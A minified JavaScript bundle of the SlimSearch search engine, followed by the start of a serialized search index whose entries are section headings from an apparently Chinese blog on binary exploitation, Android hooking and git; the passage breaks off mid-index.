const nt="ENTRIES",V="KEYS",T="VALUES",F="";class D{set;_type;_path;constructor(t,s){const n=t._tree,u=Array.from(n.keys());this.set=t,this._type=s,this._path=u.length>0?[{node:n,keys:u}]:[]}next(){const t=this.dive();return this.backtrack(),t}dive(){if(this._path.length===0)return{done:!0,value:void 0};const{node:t,keys:s}=E(this._path);if(E(s)===F)return{done:!1,value:this.result()};const n=t.get(E(s));return this._path.push({node:n,keys:Array.from(n.keys())}),this.dive()}backtrack(){if(this._path.length===0)return;const t=E(this._path).keys;t.pop(),!(t.length>0)&&(this._path.pop(),this.backtrack())}key(){return this.set._prefix+this._path.map(({keys:t})=>E(t)).filter(t=>t!==F).join("")}value(){return E(this._path).node.get(F)}result(){switch(this._type){case T:return this.value();case V:return this.key();default:return[this.key(),this.value()]}}[Symbol.iterator](){return this}}const E=e=>e[e.length-1],ut=(e,t,s)=>{const n=new Map;if(t===void 0)return n;const u=t.length+1,o=u+s,i=new Uint8Array(o*u).fill(s+1);for(let r=0;r<u;++r)i[r]=r;for(let r=1;r<o;++r)i[r*u]=r;return R(e,t,s,n,i,1,u,""),n},R=(e,t,s,n,u,o,i,r)=>{const d=o*i;t:for(const l of e.keys())if(l===F){const a=u[d-1];a<=s&&n.set(r,[e.get(l),a])}else{let a=o;for(let h=0;h<l.length;++h,++a){const m=l[h],p=i*a,f=p-i;let c=u[p];const g=Math.max(0,a-s-1),_=Math.min(i-1,a+s);for(let y=g;y<_;++y){const b=m!==t[y],z=u[f+y]+ +b,A=u[f+y+1]+1,w=u[p+y]+1,L=u[p+y+1]=Math.min(z,A,w);L<c&&(c=L)}if(c>s)continue t}R(e.get(l),t,s,n,u,a,i,r+l)}};class C{_tree;_prefix;_size=void 0;constructor(t=new Map,s=""){this._tree=t,this._prefix=s}atPrefix(t){if(!t.startsWith(this._prefix))throw new Error("Mismatched prefix");const[s,n]=x(this._tree,t.slice(this._prefix.length));if(s===void 0){const[u,o]=M(n);for(const i of u.keys())if(i!==F&&i.startsWith(o)){const r=new Map;return r.set(i.slice(o.length),u.get(i)),new C(r,t)}}return new C(s,t)}clear(){this._size=void 0,this._tree.clear()}delete(t){return this._size=void 0,ot(this._tree,t)}entries(){return new D(this,nt)}forEach(t){for(const[s,n]of this)t(s,n,this)}fuzzyGet(t,s){return ut(this._tree,t,s)}get(t){const s=I(this._tree,t);return s!==void 0?s.get(F):void 0}has(t){const s=I(this._tree,t);return s!==void 0&&s.has(F)}keys(){return new D(this,V)}set(t,s){if(typeof t!="string")throw new Error("key must be a string");return this._size=void 0,O(this._tree,t).set(F,s),this}get size(){if(this._size)return this._size;this._size=0;const t=this.entries();for(;!t.next().done;)this._size+=1;return this._size}update(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);return n.set(F,s(n.get(F))),this}fetch(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);let u=n.get(F);return u===void 0&&n.set(F,u=s()),u}values(){return new D(this,T)}[Symbol.iterator](){return this.entries()}static from(t){const s=new C;for(const[n,u]of t)s.set(n,u);return s}static fromObject(t){return C.from(Object.entries(t))}}const x=(e,t,s=[])=>{if(t.length===0||e==null)return[e,s];for(const n of e.keys())if(n!==F&&t.startsWith(n))return s.push([e,n]),x(e.get(n),t.slice(n.length),s);return s.push([e,t]),x(void 0,"",s)},I=(e,t)=>{if(t.length===0||e==null)return e;for(const s of e.keys())if(s!==F&&t.startsWith(s))return I(e.get(s),t.slice(s.length))},O=(e,t)=>{const s=t.length;t:for(let n=0;e&&n<s;){for(const o of e.keys())if(o!==F&&t[n]===o[0]){const i=Math.min(s-n,o.length);let r=1;for(;r<i&&t[n+r]===o[r];)++r;const d=e.get(o);if(r===o.length)e=d;else{const l=new Map;l.set(o.slice(r),d),e.set(t.slice(n,n+r),l),e.delete(o),e=l}n+=r;continue t}const u=new Map;return e.set(t.slice(n),u),u}return e},ot=(e,t)=>{const[s,n]=x(e,t);if(s!==void 0){if(s.delete(F),s.size===0)W(n);else if(s.size===1){const[u,o]=s.entries().next().value;q(n,u,o)}}},W=e=>{if(e.length===0)return;const[t,s]=M(e);if(t.delete(s),t.size===0)W(e.slice(0,-1));else if(t.size===1){const[n,u]=t.entries().next().value;n!==F&&q(e.slice(0,-1),n,u)}},q=(e,t,s)=>{if(e.length===0)return;const[n,u]=M(e);n.set(u+t,s),n.delete(u)},M=e=>e[e.length-1],it=(e,t)=>{const s=e._idToShortId.get(t);if(s!=null)return e._storedFields.get(s)},rt=/[\n\r -#%-*,-/:;?@[-\]_{}\u00A0\u00A1\u00A7\u00AB\u00B6\u00B7\u00BB\u00BF\u037E\u0387\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u09FD\u0A76\u0AF0\u0C77\u0C84\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F14\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1360-\u1368\u1400\u166E\u1680\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CC0-\u1CC7\u1CD3\u2000-\u200A\u2010-\u2029\u202F-\u2043\u2045-\u2051\u2053-\u205F\u207D\u207E\u208D\u208E\u2308-\u230B\u2329\u232A\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30-\u2E4F\u3000-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA8FC\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uAAF0\uAAF1\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]+/u,S="or",$="and",ct="and_not",lt=(e,t)=>{e.includes(t)||e.push(t)},P=(e,t)=>{for(const s of t)e.includes(s)||e.push(s)},N=({score:e},{score:t})=>t-e,ht=()=>new Map,k=e=>{const t=new Map;for(const s of Object.keys(e))t.set(parseInt(s,10),e[s]);return t},G=(e,t)=>Object.prototype.hasOwnProperty.call(e,t)?e[t]:void 0,dt={[S]:(e,t)=>{for(const s of t.keys()){const n=e.get(s);if(n==null)e.set(s,t.get(s));else{const{score:u,terms:o,match:i}=t.get(s);n.score=n.score+u,n.match=Object.assign(n.match,i),P(n.terms,o)}}return e},[$]:(e,t)=>{const s=new Map;for(const n of t.keys()){const u=e.get(n);if(u==null)continue;const{score:o,terms:i,match:r}=t.get(n);P(u.terms,i),s.set(n,{score:u.score+o,terms:u.terms,match:Object.assign(u.match,r)})}return s},[ct]:(e,t)=>{for(const s of t.keys())e.delete(s);return e}},at=(e,t,s,n,u,o)=>{const{k:i,b:r,d}=o;return Math.log(1+(s-t+.5)/(t+.5))*(d+e*(i+1)/(e+i*(1-r+r*n/u)))},ft=e=>(t,s,n)=>{const u=typeof e.fuzzy=="function"?e.fuzzy(t,s,n):e.fuzzy||!1,o=typeof e.prefix=="function"?e.prefix(t,s,n):e.prefix===!0;return{term:t,fuzzy:u,prefix:o}},H=(e,t,s,n)=>{for(const u of Object.keys(e._fieldIds))if(e._fieldIds[u]===s){e._options.logger("warn",`SlimSearch: document with ID ${e._documentIds.get(t)} has changed before removal: term "${n}" was not present in field "${u}". Removing a document after it has changed can corrupt the index!`,"version_conflict");return}},gt=(e,t,s,n)=>{if(!e._index.has(n)){H(e,s,t,n);return}const u=e._index.fetch(n,ht),o=u.get(t);o==null||o.get(s)==null?H(e,s,t,n):o.get(s)<=1?o.size<=1?u.delete(t):o.delete(s):o.set(s,o.get(s)-1),e._index.get(n).size===0&&e._index.delete(n)},mt={k:1.2,b:.7,d:.5},pt={idField:"id",extractField:(e,t)=>e[t],tokenize:e=>e.split(rt),processTerm:e=>e.toLowerCase(),fields:void 0,searchOptions:void 0,storeFields:[],logger:(e,t)=>{typeof console?.[e]=="function"&&console[e](t)},autoVacuum:!0},J={combineWith:S,prefix:!1,fuzzy:!1,maxFuzzy:6,boost:{},weights:{fuzzy:.45,prefix:.375},bm25:mt},Ft={combineWith:$,prefix:(e,t,s)=>t===s.length-1},_t={batchSize:1e3,batchWait:10},U={minDirtFactor:.1,minDirtCount:20},yt={..._t,...U},Y=(e,t=S)=>{if(e.length===0)return new Map;const s=t.toLowerCase();return e.reduce(dt[s])||new Map},B=(e,t,s,n,u,o,i,r,d=new Map)=>{if(u==null)return d;for(const l of Object.keys(o)){const a=o[l],h=e._fieldIds[l],m=u.get(h);if(m==null)continue;let p=m.size;const f=e._avgFieldLength[h];for(const c of m.keys()){if(!e._documentIds.has(c)){gt(e,h,c,s),p-=1;continue}const g=i?i(e._documentIds.get(c),s,e._storedFields.get(c)):1;if(!g)continue;const _=m.get(c),y=e._fieldLength.get(c)[h],b=at(_,p,e._documentCount,y,f,r),z=n*a*g*b,A=d.get(c);if(A){A.score+=z,lt(A.terms,t);const w=G(A.match,s);w?w.push(l):A.match[s]=[l]}else d.set(c,{score:z,terms:[t],match:{[s]:[l]}})}}return d},At=(e,t,s)=>{const n={...e._options.searchOptions,...s},u=(n.fields||e._options.fields).reduce((c,g)=>({...c,[g]:G(n.boost,g)||1}),{}),{boostDocument:o,weights:i,maxFuzzy:r,bm25:d}=n,{fuzzy:l,prefix:a}={...J.weights,...i},h=e._index.get(t.term),m=B(e,t.term,t.term,1,h,u,o,d);let p,f;if(t.prefix&&(p=e._index.atPrefix(t.term)),t.fuzzy){const c=t.fuzzy===!0?.2:t.fuzzy,g=c<1?Math.min(r,Math.round(t.term.length*c)):c;g&&(f=e._index.fuzzyGet(t.term,g))}if(p)for(const[c,g]of p){const _=c.length-t.term.length;if(!_)continue;f?.delete(c);const y=a*c.length/(c.length+.3*_);B(e,t.term,c,y,g,u,o,d,m)}if(f)for(const c of f.keys()){const[g,_]=f.get(c);if(!_)continue;const y=l*c.length/(c.length+_);B(e,t.term,c,y,g,u,o,d,m)}return m},X=(e,t,s={})=>{if(typeof t!="string"){const a={...s,...t,queries:void 0},h=t.queries.map(m=>X(e,m,a));return Y(h,a.combineWith)}const{tokenize:n,processTerm:u,searchOptions:o}=e._options,i={tokenize:n,processTerm:u,...o,...s},{tokenize:r,processTerm:d}=i,l=r(t).flatMap(a=>d(a)).filter(a=>!!a).map(ft(i)).map(a=>At(e,a,i));return Y(l,i.combineWith)},K=(e,t,s={})=>{const n=X(e,t,s),u=[];for(const[o,{score:i,terms:r,match:d}]of n){const l=r.length,a={id:e._documentIds.get(o),score:i*l,terms:Object.keys(d),match:d};Object.assign(a,e._storedFields.get(o)),(s.filter==null||s.filter(a))&&u.push(a)}return u.sort(N),u},Ct=(e,t,s={})=>{s={...e._options.autoSuggestOptions,...s};const n=new Map;for(const{score:o,terms:i}of K(e,t,s)){const r=i.join(" "),d=n.get(r);d!=null?(d.score+=o,d.count+=1):n.set(r,{score:o,terms:i,count:1})}const u=[];for(const[o,{score:i,terms:r,count:d}]of n)u.push({suggestion:o,terms:r,score:i/d});return u.sort(N),u};class Et{_options;_index;_documentCount;_documentIds;_idToShortId;_fieldIds;_fieldLength;_avgFieldLength;_nextId;_storedFields;_dirtCount;_currentVacuum;_enqueuedVacuum;_enqueuedVacuumConditions;constructor(t){if(t?.fields==null)throw new Error('SlimSearch: option "fields" must be provided');const s=t.autoVacuum==null||t.autoVacuum===!0?yt:t.autoVacuum;this._options={...pt,...t,autoVacuum:s,searchOptions:{...J,...t.searchOptions||{}},autoSuggestOptions:{...Ft,...t.autoSuggestOptions||{}}},this._index=new C,this._documentCount=0,this._documentIds=new Map,this._idToShortId=new Map,this._fieldIds={},this._fieldLength=new Map,this._avgFieldLength=[],this._nextId=0,this._storedFields=new Map,this._dirtCount=0,this._currentVacuum=null,this._enqueuedVacuum=null,this._enqueuedVacuumConditions=U,this.addFields(this._options.fields)}get isVacuuming(){return this._currentVacuum!=null}get dirtCount(){return this._dirtCount}get dirtFactor(){return this._dirtCount/(1+this._documentCount+this._dirtCount)}get documentCount(){return this._documentCount}get termCount(){return this._index.size}toJSON(){const t=[];for(const[s,n]of this._index){const u={};for(const[o,i]of n)u[o]=Object.fromEntries(i);t.push([s,u])}return{documentCount:this._documentCount,nextId:this._nextId,documentIds:Object.fromEntries(this._documentIds),fieldIds:this._fieldIds,fieldLength:Object.fromEntries(this._fieldLength),averageFieldLength:this._avgFieldLength,storedFields:Object.fromEntries(this._storedFields),dirtCount:this._dirtCount,index:t,serializationVersion:2}}addFields(t){for(let s=0;s<t.length;s++)this._fieldIds[t[s]]=s}}const zt=({index:e,documentCount:t,nextId:s,documentIds:n,fieldIds:u,fieldLength:o,averageFieldLength:i,storedFields:r,dirtCount:d,serializationVersion:l},a)=>{if(l!==1&&l!==2)throw new Error("SlimSearch: cannot deserialize an index created with an incompatible version");const h=new Et(a);h._documentCount=t,h._nextId=s,h._documentIds=k(n),h._idToShortId=new Map,h._fieldIds=u,h._fieldLength=k(o),h._avgFieldLength=i,h._storedFields=k(r),h._dirtCount=d||0,h._index=new C;for(const[m,p]of h._documentIds)h._idToShortId.set(p,m);for(const[m,p]of e){const f=new Map;for(const c of Object.keys(p)){let g=p[c];l===1&&(g=g.ds),f.set(parseInt(c,10),k(g))}h._index.set(m,f)}return h},Q=Object.entries,wt=Object.fromEntries,j=(e,t)=>{const s=e.toLowerCase(),n=t.toLowerCase(),u=[];let o=0,i=0;const r=(l,a=!1)=>{let h="";i===0?h=l.length>20?`… ${l.slice(-20)}`:l:a?h=l.length+i>100?`${l.slice(0,100-i)}… `:l:h=l.length>20?`${l.slice(0,20)} … ${l.slice(-20)}`:l,h&&u.push(h),i+=h.length,a||(u.push(["mark",t]),i+=t.length,i>=100&&u.push(" …"))};let d=s.indexOf(n,o);if(d===-1)return null;for(;d>=0;){const l=d+n.length;if(r(e.slice(o,d)),o=l,i>100)break;d=s.indexOf(n,o)}return i<100&&r(e.slice(o),!0),u},Z=/[\u4e00-\u9fa5]/g,tt=(e={})=>({fuzzy:.2,prefix:!0,processTerm:t=>{const s=t.match(Z)||[],n=t.replace(Z,"").toLowerCase();return n?[n,...s]:[...s]},...e}),xt=(e,t)=>t.contents.reduce((s,[,n])=>s+n,0)-e.contents.reduce((s,[,n])=>s+n,0),kt=(e,t)=>Math.max(...t.contents.map(([,s])=>s))-Math.max(...e.contents.map(([,s])=>s)),et=(e,t,s={})=>{const n={};return K(t,e,tt({boost:{h:2,t:1,c:4},...s})).forEach(u=>{const{id:o,terms:i,score:r}=u,d=o.includes("@"),l=o.includes("#"),[a,h]=o.split(/[#@]/),m=i.sort((f,c)=>f.length-c.length).filter((f,c)=>i.slice(c+1).every(g=>!g.includes(f))),{contents:p}=n[a]??={title:"",contents:[]};if(d)p.push([{type:"customField",key:a,index:h,display:m.map(f=>u.c.map(c=>j(c,f))).flat().filter(f=>f!==null)},r]);else{const f=m.map(c=>j(u.h,c)).filter(c=>c!==null);if(f.length&&p.push([{type:l?"heading":"title",key:a,...l&&{anchor:h},display:f},r]),"t"in u)for(const c of u.t){const g=m.map(_=>j(c,_)).filter(_=>_!==null);g.length&&p.push([{type:"text",key:a,...l&&{anchor:h},display:g},r])}}}),Q(n).sort(([,u],[,o])=>"max"==="total"?xt(u,o):kt(u,o)).map(([u,{title:o,contents:i}])=>{if(!o){const r=it(t,u);r&&(o=r.h)}return{title:o,contents:i.map(([r])=>r)}})},st=(e,t,s={})=>Ct(t,e,tt(s)).map(({suggestion:n})=>n),v=wt(Q(JSON.parse("{\"/\":{\"documentCount\":309,\"nextId\":309,\"documentIds\":{\"0\":\"v-8daa1a0e\",\"1\":\"v-6cea81ab\",\"2\":\"v-6cea81ab#必备的信息\",\"3\":\"v-6cea81ab#项目背景-background\",\"4\":\"v-6cea81ab#安装和使用-install-usage\",\"5\":\"v-6cea81ab#badge\",\"6\":\"v-6cea81ab#主要项目负责人-maintainers\",\"7\":\"v-6cea81ab#参加贡献的方式-contributing\",\"8\":\"v-6cea81ab#开源协议-license\",\"9\":\"v-623b66b3\",\"10\":\"v-623b66b3#映射端口\",\"11\":\"v-623b66b3#pc查询手机的进程\",\"12\":\"v-623b66b3#hook相关\",\"13\":\"v-623b66b3#hook-js脚本\",\"14\":\"v-623b66b3#附着脚本\",\"15\":\"v-623b66b3#js代码的书写\",\"16\":\"v-623b66b3#使用java的平台\",\"17\":\"v-623b66b3#获取指定的java类\",\"18\":\"v-623b66b3#调用原本的函数\",\"19\":\"v-623b66b3#hook重载函数\",\"20\":\"v-623b66b3#hook构造方法\",\"21\":\"v-623b66b3#修改类的字段\",\"22\":\"v-623b66b3#枚举所有的类和方法\",\"23\":\"v-623b66b3#hook-so中的函数\",\"24\":\"v-4e13633e\",\"25\":\"v-4e13633e#实战\",\"26\":\"v-4e13633e#获取包名\",\"27\":\"v-4e13633e#hook-一个测试脚本\",\"28\":\"v-a8c94236\",\"29\":\"v-a8c94236#链接\",\"30\":\"v-a8c94236#初步探索\",\"31\":\"v-a8c94236#分析\",\"32\":\"v-a8c94236#istextwidgetactive\",\"33\":\"v-a8c94236#getcursorposition\",\"34\":\"v-a8c94236#tick\",\"35\":\"v-38d36cdf\",\"36\":\"v-38d36cdf#学习文章\",\"37\":\"v-38d36cdf#主标签\",\"38\":\"v-38d36cdf#默认activity\",\"39\":\"v-38d36cdf#intent-filter标签\",\"40\":\"v-38d36cdf#默认activity标志\",\"41\":\"v-3bce6cc4\",\"42\":\"v-3bce6cc4#版本对应\",\"43\":\"v-3bce6cc4#操作指令\",\"44\":\"v-3bce6cc4#主力pwn环境\",\"45\":\"v-3bce6cc4#pull-image\",\"46\":\"v-3bce6cc4#error\",\"47\":\"v-3bce6cc4#各版本的轻量级pwn环境\",\"48\":\"v-b571a054\",\"49\":\"v-b571a054#提交信息格式\",\"50\":\"v-b571a054#格式\",\"51\":\"v-b571a054#commit的内容\",\"52\":\"v-b571a054#分支管理\",\"53\":\"v-b571a054#主分支\",\"54\":\"v-b571a054#code-review\",\"55\":\"v-b571a054#提交pr的规范\",\"56\":\"v-13caecc3\",\"57\":\"v-13caecc3#目的\",\"58\":\"v-13caecc3#使用git-revert原因\",\"59\":\"v-13caecc3#git-revert的类型\",\"60\":\"v-13caecc3#使用git-revert的注意事项\",\"61\":\"v-13caecc3#实践\",\"62\":\"v-e329e17e\",\"63\":\"v-e329e17e#基础对象\",\"64\":\"v-e329e17e#eventloop\",\"65\":\"v-e329e17e#future\",\"66\":\"v-e329e17e#generator生成器\",\"67\":\"v-e329e17e#基本使用\",\"68\":\"v-d6013428\",\"69\":\"v-d6013428#重要知识点\",\"70\":\"v-d6013428#tcahe机制\",\"71\":\"v-d6013428#机制\",\"72\":\"v-d6013428#利用tcache泄露地址\",\"73\":\"v-43bd25bc\",\"74\":\"v-43bd25bc#原理\",\"75\":\"v-43bd25bc#脚本\",\"76\":\"v-77dd3320\",\"77\":\"v-77dd3320#分析一下题\",\"78\":\"v-77dd3320#chunk分析\",\"79\":\"v-77dd3320#漏洞学习\",\"80\":\"v-77dd3320#先学习unlink漏洞\",\"81\":\"v-77dd3320#流程\",\"82\":\"v-77dd3320#调试技巧\",\"83\":\"v-77dd3320#学习路线\",\"84\":\"v-b7f9189e\",\"85\":\"v-b7f9189e#版本\",\"86\":\"v-b7f9189e#读题\",\"87\":\"v-b7f9189e#错误思路\",\"88\":\"v-b7f9189e#失败原因\",\"89\":\"v-6ff5a7c0\",\"90\":\"v-6ff5a7c0#源码\",\"91\":\"v-6ff5a7c0#漏洞利用图\",\"92\":\"v-64cbeebf\",\"93\":\"v-64cbeebf#源码分析-largebin-malloc\",\"94\":\"v-64cbeebf#unsortedbin的合并-入链-分配操作\",\"95\":\"v-64cbeebf#遍历的开始-梦的开始\",\"96\":\"v-64cbeebf#调试\",\"97\":\"v-64cbeebf#安全检查机制\",\"98\":\"v-64cbeebf#直接返回smallbin-chunk情况\",\"99\":\"v-64cbeebf#从unsortedbin中移除\",\"100\":\"v-64cbeebf#大小刚好相等情况\",\"101\":\"v-64cbeebf#归类入链操作\",\"102\":\"v-64cbeebf#small-和-large最终入bin操作\",\"103\":\"v-64cbeebf#smallbin的fwd-bck赋值\",\"104\":\"v-64cbeebf#largebin-入bin链和chunk-size链\",\"105\":\"v-64cbeebf#从largebin中获取chunk\",\"106\":\"v-64cbeebf#chunk脱链-remainder-chunk入链\",\"107\":\"v-64cbeebf#返回被切割后的chunk\",\"108\":\"v-64cbeebf#从topchunk中获取chunk\",\"109\":\"v-64cbeebf#int-free-源码\",\"110\":\"v-64cbeebf#漏洞利用\",\"111\":\"v-c4a7106c\",\"112\":\"v-c4a7106c#堆管理器\",\"113\":\"v-c4a7106c#流程\",\"114\":\"v-c4a7106c#chunk结构\",\"115\":\"v-c4a7106c#申请内存的过程\",\"116\":\"v-c7dd73e6\",\"117\":\"v-c7dd73e6#tsl-了解\",\"118\":\"v-c7dd73e6#gdb-如何查-fs\",\"119\":\"v-c7dd73e6#bin\",\"120\":\"v-c7dd73e6#free-源码分析\",\"121\":\"v-c7dd73e6#malloc源码分析\",\"122\":\"v-c7dd73e6#fastbin\",\"123\":\"v-c7dd73e6#tcache\",\"124\":\"v-c7dd73e6#fastbin-dup\",\"125\":\"v-c7dd73e6#tcache利用\",\"126\":\"v-2c979d9a\",\"127\":\"v-2c979d9a#tcache-dup\",\"128\":\"v-2c979d9a#unsortedbin\",\"129\":\"v-2c979d9a#consolidate\",\"130\":\"v-2c979d9a#unsafeunlink-off-by-one\",\"131\":\"v-52fac821\",\"132\":\"v-52fac821#主分配区-和-非主分配区\",\"133\":\"v-52fac821#多线程分配\",\"134\":\"v-52fac821#流程\",\"135\":\"v-52fac821#调用链\",\"136\":\"v-52fac821#arena-get\",\"137\":\"v-52fac821#arena-get2\",\"138\":\"v-52fac821#int-new-arena-new-arena\",\"139\":\"v-52fac821#reused-arena\",\"140\":\"v-2751bf8d\",\"141\":\"v-2751bf8d#题目\",\"142\":\"v-2751bf8d#原理\",\"143\":\"v-2751bf8d#实践\",\"144\":\"v-2751bf8d#修改思路\",\"145\":\"v-2751bf8d#结果\",\"146\":\"v-495e7439\",\"147\":\"v-495e7439#安全检查机制\",\"148\":\"v-495e7439#利用原理\",\"149\":\"v-495e7439#利用\",\"150\":\"v-495e7439#构造chunk-header\",\"151\":\"v-495e7439#构造fd-bk\",\"152\":\"v-495e7439#构造bk-fd\",\"153\":\"v-495e7439#构造合并chunk\",\"154\":\"v-495e7439#脚本\",\"155\":\"v-750d4f64\",\"156\":\"v-750d4f64#审题\",\"157\":\"v-750d4f64#大致利用原理\",\"158\":\"v-750d4f64#泄露libc-heap\",\"159\":\"v-750d4f64#伪造fake-chunk\",\"160\":\"v-750d4f64#示意图\",\"161\":\"v-750d4f64#fastbin合并机制\",\"162\":\"v-750d4f64#构造fakecchunk\",\"163\":\"v-750d4f64#泄露tls-0x30\",\"164\":\"v-750d4f64#fd加密机制\",\"165\":\"v-750d4f64#劫持exit-funcs链表\",\"166\":\"v-f211345e\",\"167\":\"v-f211345e#参考文章\",\"168\":\"v-f211345e#条件\",\"169\":\"v-f211345e#house-of-apple1原理\",\"170\":\"v-f211345e#覆盖vatble\",\"171\":\"v-f211345e#触发exit\",\"172\":\"v-f211345e#调用-io-wstrn-overflow\",\"173\":\"v-f211345e#覆写数据\",\"174\":\"v-f211345e#结构体-io-file-complete\",\"175\":\"v-f211345e#结构体-io-wide-data\",\"176\":\"v-f211345e#结构体-io-wstrnfile\",\"177\":\"v-f211345e#示意图\",\"178\":\"v-f211345e#house-of-apple-2原理\",\"179\":\"v-f211345e#io-overflow调用\",\"180\":\"v-f211345e#io-wfile-overflow的调用\",\"181\":\"v-f211345e#示意图-1\",\"182\":\"v-f211345e#原理脚本\",\"183\":\"v-2d1aad9b\",\"184\":\"v-2d1aad9b#核心结构体\",\"185\":\"v-2d1aad9b#file\",\"186\":\"v-2d1aad9b#vtable\",\"187\":\"v-2d1aad9b#io函数函数的原理\",\"188\":\"v-2d1aad9b#fopen函数\",\"189\":\"v-2d1aad9b#调试源码-深入理解\",\"190\":\"v-2d1aad9b#进入open64\",\"191\":\"v-2d1aad9b#malloc-部分\",\"192\":\"v-2d1aad9b#源码\",\"193\":\"v-2d1aad9b#调试\",\"194\":\"v-2d1aad9b#初始化-io-no-init\",\"195\":\"v-2d1aad9b#源码-1\",\"196\":\"v-2d1aad9b#调试-1\",\"197\":\"v-2d1aad9b#vtable表赋值\",\"198\":\"v-2d1aad9b#源码-2\",\"199\":\"v-2d1aad9b#调试-2\",\"200\":\"v-2d1aad9b#链接部分\",\"201\":\"v-2d1aad9b#源码-3\",\"202\":\"v-2d1aad9b#调试-3\",\"203\":\"v-2d1aad9b#打开文件\",\"204\":\"v-2d1aad9b#源码-4\",\"205\":\"v-2d1aad9b#调试-4\",\"206\":\"v-6d1ad62f\",\"207\":\"v-6d1ad62f#利用条件\",\"208\":\"v-6d1ad62f#io-flush-all-lockp-libc-2-23\",\"209\":\"v-6d1ad62f#获取fp\",\"210\":\"v-6d1ad62f#所有的文件流\",\"211\":\"v-6d1ad62f#条件\",\"212\":\"v-6d1ad62f#libc2-24-防御机制\",\"213\":\"v-6d1ad62f#io-validate-vtable\",\"214\":\"v-6d1ad62f#libc2-24-io-file利用\",\"215\":\"v-6d1ad62f#小知识点\",\"216\":\"v-6d1ad62f#对-io-buf-base进行劫持\",\"217\":\"v-0a5cf70e\",\"218\":\"v-0a5cf70e#最开始的两行代码\",\"219\":\"v-0a5cf70e#解释\",\"220\":\"v-0a5cf70e#_0x7c00到0x90000\",\"221\":\"v-318791e4\",\"222\":\"v-318791e4#php扩展学习\",\"223\":\"v-318791e4#heap相关学习\",\"224\":\"v-318791e4#small-malloc-and-free\",\"225\":\"v-318791e4#调试\",\"226\":\"v-318791e4#malloc\",\"227\":\"v-318791e4#free\",\"228\":\"v-e8a0a482\",\"229\":\"v-e8a0a482#栈迁移\",\"230\":\"v-e8a0a482#栈迁移的大致操作\",\"231\":\"v-e8a0a482#栈迁移核心\",\"232\":\"v-4e6402dc\",\"233\":\"v-4e6402dc#部分前置知识讲解\",\"234\":\"v-4e6402dc#got表和plt表详细解说\",\"235\":\"v-4e6402dc#dl-runtime-resolve部分详细解说\",\"236\":\"v-4e6402dc#reloc-index\",\"237\":\"v-ed95b87a\",\"238\":\"v-ed95b87a#程序寻找libc的顺序\",\"239\":\"v-ed95b87a#linux程序加载简化流程\",\"240\":\"v-ed95b87a#查看程序当前信息\",\"241\":\"v-ed95b87a#修改程序的ld和libc地址\",\"242\":\"v-596613ec\",\"243\":\"v-596613ec#解释部分函数\",\"244\":\"v-596613ec#正式做题\",\"245\":\"v-596613ec#流程\",\"246\":\"v-596613ec#动调\",\"247\":\"v-596613ec#脚本\",\"248\":\"v-654f50a4\",\"249\":\"v-654f50a4#linux中常用的指令\",\"250\":\"v-654f50a4#ifs变量\",\"251\":\"v-654f50a4#ifs-的工作原理\",\"252\":\"v-654f50a4#这里举列子\",\"253\":\"v-654f50a4#payload\",\"254\":\"v-53e9535c\",\"255\":\"v-53e9535c#实验float的存储数据\",\"256\":\"v-53e9535c#尝试覆盖\",\"257\":\"v-0de2da6d\",\"258\":\"v-0de2da6d#babygift\",\"259\":\"v-0de2da6d#fastfastfast\",\"260\":\"v-0de2da6d#脚本\",\"261\":\"v-0de2da6d#fmt\",\"262\":\"v-0de2da6d#exit-hook地址写入栈\",\"263\":\"v-0de2da6d#选择\",\"264\":\"v-0de2da6d#脚本-1\",\"265\":\"v-0de2da6d#guestbook\",\"266\":\"v-0de2da6d#hello-world\",\"267\":\"v-0de2da6d#intermittent\",\"268\":\"v-0de2da6d#inviisible-flag\",\"269\":\"v-0de2da6d#malloc-flag\",\"270\":\"v-0de2da6d#ez1-0-mips\",\"271\":\"v-0de2da6d#ez2-0-arm\",\"272\":\"v-0de2da6d#one-byte\",\"273\":\"v-0de2da6d#劫持freechunk\",\"274\":\"v-0de2da6d#ptmalloc2-its-myheap\",\"275\":\"v-0de2da6d#劫持head-chunk\",\"276\":\"v-0de2da6d#脚本-2\",\"277\":\"v-0de2da6d#ptmalloc2-it-s-myheap-pro-glibc2-35下的exit函数打法\",\"278\":\"v-0de2da6d#审题\",\"279\":\"v-0de2da6d#大致利用原理\",\"280\":\"v-0de2da6d#泄露libc-heap\",\"281\":\"v-0de2da6d#伪造fake-chunk\",\"282\":\"v-0de2da6d#示意图\",\"283\":\"v-0de2da6d#fastbin合并机制\",\"284\":\"v-0de2da6d#构造fakecchunk\",\"285\":\"v-0de2da6d#泄露tls-0x30\",\"286\":\"v-0de2da6d#fd加密机制\",\"287\":\"v-0de2da6d#劫持exit-funcs链表\",\"288\":\"v-0de2da6d#ptmalloc2-it-s-myheap-plus-orw-exit\",\"289\":\"v-0de2da6d#static-link\",\"290\":